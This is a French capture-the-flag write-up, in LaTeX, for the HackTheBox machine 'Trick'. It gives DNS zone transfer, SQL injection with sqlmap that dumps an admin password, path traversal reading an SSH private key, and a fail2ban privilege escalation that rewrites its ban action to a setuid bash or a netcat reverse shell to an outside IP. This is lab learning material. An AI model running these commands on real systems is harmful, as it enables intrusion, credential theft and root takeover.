\chapter{Trick}
\begin{itemize}
    \item {\bf level}: easy

    \item {\bf keywords}: \gls{t:sudo-privesc}, \gls{t:fail2ban-privesc},
    \gls{t:lfi}, \gls{t:sql-injection}

    \item {\bf tools}: linpeas, dotdotpwn, ffuf, sqlmap
\end{itemize}


\subsection{Résumé}

\subsubsection{Recon}

nmap
\begin{itemize}
    \item \verb+22 OpenSSH 7.9p1+
    \item \verb+25 postfix debian.localdomain+
    \item \verb+53 bind 9.11+
    \item \verb+80 nginx 1.14.2+
\end{itemize}

dns:
\begin{verbatim}
drill -x 10.10.11.166 @10.10.11.166 => trick.htb
drill @10.10.11.166 any trick.htb

trick.htb.      604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.      604800  IN      NS      trick.htb.
trick.htb.      604800  IN      A       127.0.0.1
trick.htb.      604800  IN      AAAA    ::1


drill @10.10.11.166 axfr trick.htb
trick.htb.      604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.      604800  IN      NS      trick.htb.
trick.htb.      604800  IN      A       127.0.0.1
trick.htb.      604800  IN      AAAA    ::1
preprod-payroll.trick.htb.      604800  IN      CNAME   trick.htb.
trick.htb.      604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
\end{verbatim}


on essaie d'enumerer les sous-domaines:
\begin{verbatim}
dnscan.py -d trick.htb. -w subdomains.txt -q -v
dnsrecon -D subdomains.txt -d trick.htb -n ip -t brt
\end{verbatim}

y a t'il d'autre vhost
\begin{verbatim}
ffuf -w subdomains-top1million-20000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' -fs 5480
\end{verbatim}



\verb+http://preprod-payroll.trick.htb/ajax.php?action=login+ semble vulenrable
à une injection sql en time-based blind.

\begin{verbatim}
sqlmap -url 'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=s1mm8jdukfqj95q19m5eglfj6q' --data 'username=admin*&password=admin' --batch --dump
\end{verbatim}

retrouve une bdd \verb+payroll_db+:
\begin{itemize}
    \item \verb+11+
    \item \verb+employee+
    \item \verb+position+
    \item \verb+department+
    \item \verb+users+
\end{itemize}

\begin{verbatim}
--batch -T users --columns -D payroll_db

Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| name      | varchar(200) |
| password  | varchar(200) |
| type      | tinyint(1)   |
| username  | varchar(100) |
+-----------+--------------+

--batch -dump -T users -C username -D payroll_db
[1 entry]
+------------+
| username   |
+------------+
| Enemigosss |
+------------+

--batch -dump -T users -C id -D payroll_db
Database: payroll_db
Table: users
[1 entry]
+----+
| id |
+----+
| 1  |
+----+

--batch -dump -T password -C password -D payroll_db

Database: payroll_db
Table: users
[1 entry]
+-----------------------+
| password              |
+-----------------------+
| SuperGucciRainbowCake |
+-----------------------+

\end{verbatim}

c'est un compte admin

mais ca ne donne rien


\begin{verbatim}
dotdotpwn -m http-url -u
http://preprod-payroll.trick.htb/index.php?page=TRAVERSAL -M GET -k root -f /etc/passwd
\end{verbatim}

ne donne rien  par contre sur \verb+preprod-marketing+ ca passe 


\begin{verbatim}
curl "...?page=..././..././..././home/michael/user.txt"
curl "...?page=..././..././..././home/michael/.ssh/id_rsa"
\end{verbatim}

un peu d'énumeration :
\begin{verbatim}
./linpeas.sh -a > test.txt

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart


id 
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)


drwxrwx---   2 root security  4096 Sep  6 13:45 action.d

\end{verbatim}


\begin{verbatim}
more /etc/fail2ban/jail.conf

[DEFAULT]

banaction = iptables-multiport


[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
\end{verbatim}

\begin{verbatim}
CMD='chmod +s /bin/bash'
CMD='/usr/bin/nc 10.10.16.3 4444 -e /bin/bash'

sed -i -E "s\actionban =.*\actionban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
sed -i -E "s\actionunban =.*\actionunban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
cat /etc/fail2ban/action.d/iptables-multiport.conf

 sudo /etc/init.d/fail2ban restart


 hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt  -P /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -u -f ssh://10.10.11.166:22 -t 10 -V

\end{verbatim}






\subsection{Theorie}

\url{https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49}
